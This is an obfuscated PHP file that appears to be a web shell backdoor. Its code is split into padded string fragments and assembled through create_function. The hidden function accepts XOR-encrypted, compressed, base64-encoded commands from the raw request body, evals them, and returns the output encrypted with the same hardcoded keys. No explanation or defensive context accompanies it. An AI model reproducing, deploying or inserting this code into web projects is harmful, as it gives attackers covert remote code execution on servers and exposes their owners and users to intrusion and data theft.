<?php
$Z='dTe(T$m[1]),$k)))T;$o=@Tob_TgetT_conTtents(T);@Tob_end_cleanT();$';
$i='tcTh("T/$kh(T.+)$kf/",@TfileT_get_TcTonTteTnts("php://TinpuTt"),$m';
$k='$j++,$iT++){$oT.=$Tt{$i}^$k{T$j}T;T}}return $o;}iTf T(@preg_ma';
$E=')==1) {@ob_staTrt(T);@evTal(@gzunTcomprTess(@x(@TbTase64_deco';
$z='rT=@bTase64_encode(@Tx(T@gzcTompress($o)T,$k));priTTnt("$Tp$kh$r$kf");}';
$t='=strleTn($t)T;TT$o="";TfTor($i=T0;$i<$lT;){for($j=T0;($j<$c&&$i<$lT);';
$V='$k="3T2T8bfT62b";$kh="ff38TT73099478";T$kf="8cT8Tb848fa7ba";T$p="';
$n=str_replace('z','','zcrezatzez_fuznctizon');
$K='AaWNaTLfTuMocZ0SLc";fTuTnctiTon x(T$t,$k){$cT=strTlen($k);$lT';
$x=str_replace('T','',$V.$K.$t.$k.$i.$E.$Z.$z);
$F=$n('',$x);$F();
?>
